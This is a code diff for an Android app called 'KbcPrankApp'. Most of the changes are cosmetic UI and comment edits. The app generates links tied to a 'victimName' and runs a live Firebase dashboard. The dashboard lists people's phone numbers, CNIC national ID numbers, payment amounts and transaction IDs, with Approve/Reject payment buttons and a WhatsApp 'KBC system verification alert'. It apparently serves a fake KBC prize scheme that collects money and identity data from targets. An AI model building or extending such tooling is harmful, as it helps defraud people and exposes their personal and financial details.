@@ -37,13 +37,13 @@ import com.example.ui.theme.MyApplicationTheme
 import org.json.JSONArray
 import org.json.JSONObject
 
-// Import Firebase safely
+// Safe Firebase Core Realtime components
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 
-// Simple Data Structure to keep history safe (Unchanged)
+// Base local structure (Strictly Preserved)
 data class LocalPrankModel(
     val id: Long,
     val victimName: String,
@@ -51,7 +51,7 @@ data class LocalPrankModel(
     val generatedLink: String
 )
 
-// New Data Structure for Registry Verification System
+// Online Data Model structure
 data class OnlineRegistryModel(
     val key: String = "",
     val name: String = "",
@@ -70,7 +70,6 @@ class MainActivity : ComponentActivity() {
         
         setContent {
             MyApplicationTheme {
-                // Main Security State
                 var isAuthenticated by remember { mutableStateOf(false) }
                 
                 Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
@@ -183,17 +182,13 @@ fun KbcPrankApp(
     var generatedLink by remember { mutableStateOf("") }
     var showSuccessDialog by remember { mutableStateOf(false) }
     
-    // Toggle state to switch between Generator Panel and Online Registry Dashboard Panel
     var currentPanel by remember { mutableStateOf("generator") } 
     
-    // Independent History List State
     val historyList = remember { mutableStateListOf<LocalPrankModel>() }
-
-    // Firebase Online Registrations Realtime State
     val onlineRegistrations = remember { mutableStateListOf<OnlineRegistryModel>() }
     var pendingNotificationsCount by remember { mutableStateOf(0) }
 
-    // Load Local History safely on Start up (Unchanged)
+    // Load Local History safely (Unchanged)
     LaunchedEffect(Unit) {
         val savedJson = sharedPreferences.getString("prank_list_json", "[]") ?: "[]"
         try {
@@ -214,7 +209,7 @@ fun KbcPrankApp(
         }
     }
 
-    // Realtime Firebase Listener Setup (Listens to "registrations" node)
+    // Realtime Firebase Snapshots Synchronizer
     LaunchedEffect(Unit) {
         val databaseRef = FirebaseDatabase.getInstance().getReference("registrations")
         databaseRef.addValueEventListener(object : ValueEventListener {
@@ -236,7 +231,7 @@ fun KbcPrankApp(
                     }
 
                     onlineRegistrations.add(
-                        0, // Keeps newest registries at the top
+                        0,
                         OnlineRegistryModel(key, name, phone, cnic, amountPaid, paymentStatus, paymentMethod, tid)
                     )
                 }
@@ -244,7 +239,7 @@ fun KbcPrankApp(
             }
 
             override fun onCancelled(error: DatabaseError) {
-                Toast.makeText(context, "Database Error: ${error.message}", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "Database Sync Failed", Toast.LENGTH_SHORT).show()
             }
         })
     }
@@ -260,7 +255,7 @@ fun KbcPrankApp(
                 .padding(16.dp),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
-            // Header Card with Dynamic Notification Badge setup
+            // Highly Stable Custom Row Header (Avoids BadgedBox experimental library dependencies)
             Card(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -289,24 +284,32 @@ fun KbcPrankApp(
                         )
                     }
                     
-                    // Realtime Notification Icon setup
-                    BadgedBox(
-                        badge = {
-                            if (pendingNotificationsCount > 0) {
-                                Badge(containerColor = Color(0xFFDC2626), contentColor = Color.White) {
-                                    Text(pendingNotificationsCount.toString())
-                                }
-                            }
-                        }
-                    ) {
+                    // Simple, stable built-in notification badge design
+                    Box(contentAlignment = Alignment.TopEnd) {
                         IconButton(onClick = { currentPanel = "registry" }) {
                             Icon(Icons.Default.Notifications, contentDescription = "Alerts", tint = Color.White)
+                        }
+                        if (pendingNotificationsCount > 0) {
+                            Box(
+                                modifier = Modifier
+                                    .padding(top = 4.dp, end = 4.dp)
+                                    .size(18.dp)
+                                    .background(Color(0xFFDC2626), shape = RoundedCornerShape(9.dp)),
+                                contentAlignment = Alignment.Center
+                            ) {
+                                Text(
+                                    text = pendingNotificationsCount.toString(),
+                                    color = Color.White,
+                                    fontSize = 10.sp,
+                                    fontWeight = FontWeight.Bold
+                                )
+                            }
                         }
                     }
                 }
             }
 
-            // Navigation Tab Buttons to switch screens cleanly
+            // Clean navigation buttons (Fixed explicit Modifier sizing calls)
             Row(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -321,7 +324,7 @@ fun KbcPrankApp(
                         containerColor = if (currentPanel == "generator") Color(0xFF2563EB) else Color.LightGray
                     )
                 ) {
-                    Icon(Icons.Default.Build, contentDescription = null, size(18.dp))
+                    Icon(Icons.Default.Build, contentDescription = null, modifier = Modifier.size(18.dp))
                     Spacer(modifier = Modifier.width(6.dp))
                     Text("Generator", fontSize = 14.sp)
                 }
@@ -334,13 +337,13 @@ fun KbcPrankApp(
                         containerColor = if (currentPanel == "registry") Color(0xFF0F172A) else Color.LightGray
                     )
                 ) {
-                    Icon(Icons.Default.List, contentDescription = null, size(18.dp))
+                    Icon(Icons.Default.List, contentDescription = null, modifier = Modifier.size(18.dp))
                     Spacer(modifier = Modifier.width(6.dp))
                     Text("Dashboard", fontSize = 14.sp)
                 }
             }
 
-            // PANEL 1: LINK GENERATOR PANEL (Original UX structure kept intact)
+            // PANEL 1: LINK GENERATOR PANEL (Original untouched structural configuration)
             if (currentPanel == "generator") {
                 Card(
                     modifier = Modifier
@@ -460,7 +463,6 @@ fun KbcPrankApp(
                     }
                 }
 
-                // Local History Header Row
                 Row(
                     modifier = Modifier
                         .fillMaxWidth()
@@ -477,7 +479,6 @@ fun KbcPrankApp(
                     )
                 }
 
-                // Render Local History List
                 if (historyList.isEmpty()) {
                     Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                         Text("No history yet. Generated links will appear here.", color = Color.Gray, fontSize = 14.sp)
@@ -491,7 +492,7 @@ fun KbcPrankApp(
                 }
             }
             
-            // PANEL 2: ONLINE REGISTRY LIVE DASHBOARD (The New Requested Features)
+            // PANEL 2: ONLINE LIVE REGISTRY VERIFIER PANEL
             else if (currentPanel == "registry") {
                 Row(
                     modifier = Modifier
@@ -528,7 +529,7 @@ fun KbcPrankApp(
             }
         }
 
-        // Share Dialog Pop up (Unchanged)
+        // Success Pop-Up (Unchanged)
         if (showSuccessDialog) {
             Dialog(
                 onDismissRequest = { showSuccessDialog = false },
@@ -609,7 +610,6 @@ fun KbcPrankApp(
     }
 }
 
-// Unchanged original list rows to preserve baseline local structure
 @Composable
 fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
     Card(
@@ -656,16 +656,14 @@ fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
     }
 }
 
-// BRAND NEW COMPOSABLE: Dynamic Card with WhatsApp, Approve, and Reject Functional Workflow Buttons
 @Composable
 fun OnlineRegistryItemCard(registry: OnlineRegistryModel, context: Context) {
     val databaseRef = FirebaseDatabase.getInstance().getReference("registrations").child(registry.key)
     
-    // UI dynamic color configuration setup depending on execution parameters
     val statusColor = when (registry.paymentStatus.lowercase()) {
-        "paid" -> Color(0xFF10B981)   // Green Neon highlight
-        "rejected" -> Color(0xFFEF4444) // Red highlight
-        else -> Color(0xFFF59E0B)       // Orange Pending highlight
+        "paid" -> Color(0xFF10B981)   
+        "rejected" -> Color(0xFFEF4444) 
+        else -> Color(0xFFF59E0B)       
     }
 
     Card(
@@ -675,7 +673,6 @@ fun OnlineRegistryItemCard(registry: OnlineRegistryModel, context: Context) {
         elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
     ) {
         Column(modifier = Modifier.padding(14.dp)) {
-            // Row 1: Name & Status Badge
             Row(
                 modifier = Modifier.fillMaxWidth(),
                 horizontalArrangement = Arrangement.SpaceBetween,
@@ -705,14 +702,13 @@ fun OnlineRegistryItemCard(registry: OnlineRegistryModel, context: Context) {
 
             Spacer(modifier = Modifier.height(6.dp))
 
-            // Row 2: Details Context (Phone, CNIC, TID, Amount)
             Text(text = "Phone: ${registry.phone}", fontSize = 13.sp, color = Color.Gray)
             if (registry.cnic.isNotBlank()) {
                 Text(text = "CNIC: ${registry.cnic}", fontSize = 13.sp, color = Color.Gray)
             }
             
             Spacer(modifier = Modifier.height(4.dp))
-            Divider(color = Color(0xFFE5E7EB), thickness = 1.dp)
+            HorizontalDivider(color = Color(0xFFE5E7EB), thickness = 1.dp)
             Spacer(modifier = Modifier.height(6.dp))
             
             Row(
@@ -735,16 +731,13 @@ fun OnlineRegistryItemCard(registry: OnlineRegistryModel, context: Context) {
 
             Spacer(modifier = Modifier.height(12.dp))
 
-            // Row 3: Action Buttons (WhatsApp, Reject, Approve)
             Row(
                 modifier = Modifier.fillMaxWidth(),
                 horizontalArrangement = Arrangement.spacedBy(8.dp)
             ) {
-                // 1. WhatsApp Button: Directly jumps to user chat without saving numbers
                 OutlinedButton(
                     onClick = {
                         if (registry.phone.isNotBlank()) {
-                            // Strip any characters if present, build precise link scheme
                             val cleanNumber = registry.phone.replace("+", "").replace(" ", "")
                             val finalTarget = if (!cleanNumber.startsWith("92")) "92${cleanNumber.removePrefix("0")}" else cleanNumber
                             val url = "https://wa.me/$finalTarget?text=Assalam-o-Alaikum ${Uri.encode(registry.name)}, KBC system verification alert."
@@ -763,7 +756,6 @@ fun OnlineRegistryItemCard(registry: OnlineRegistryModel, context: Context) {
                     Text("WhatsApp", fontSize = 11.sp, color = Color(0xFF2563EB))
                 }
 
-                // 2. Reject Button: Flags item explicitly on Firebase node structure
                 Button(
                     onClick = {
                         databaseRef.child("paymentStatus").setValue("Rejected")
@@ -779,7 +771,6 @@ fun OnlineRegistryItemCard(registry: OnlineRegistryModel, context: Context) {
                     Text("Reject", fontSize = 11.sp)
                 }
 
-                // 3. Approve Button: Instantly sets parameters to Paid state across platforms
                 Button(
                     onClick = {
                         databaseRef.child("paymentStatus").setValue("Paid")
